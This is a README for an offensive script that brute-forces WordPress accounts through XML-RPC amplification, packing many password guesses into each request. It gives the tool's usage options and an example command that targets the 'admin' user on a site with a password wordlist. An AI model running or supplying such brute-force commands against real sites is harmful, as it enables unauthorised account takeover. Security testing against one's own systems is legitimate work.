# WordPress XML-RPC Brute Force Amplification Attack

This script uses a vulnerability discovered in the XML-RPC implementation in WordPress to brute force user accounts. This allows for amplification of hundreds (or thousands) of requests per individual HTTP(s) request. For more details on the attack, see the related blog post on [sucuri.net](https://blog.sucuri.net/2015/10/brute-force-amplification-attacks-against-wordpress-xmlrpc.html).

## Usage

```
usage: wpxmlrpcbrute.py [-h] [-c COUNT] [-t THREADS] [-u USER] [-a USER_AGENT]
                        [-l LEVEL]
                        url wordlist

positional arguments:
  url
  wordlist

optional arguments:
  -h, --help            show this help message and exit
  -c COUNT, --count COUNT
  -t THREADS, --threads THREADS
  -u USER, --user USER
  -l LEVEL, --level LEVEL
```

### Examples

``` bash
$ ./wpxmlrpcbrute.py -c 1500 -u admin http://example.com/ wordlists/grimwepa_pw.txt
```

## TODO

 - Exception handling within threads
 - Better feedback in UI. Debug log output works, but it isn't so clean.
 - Track number of total requests and attempts
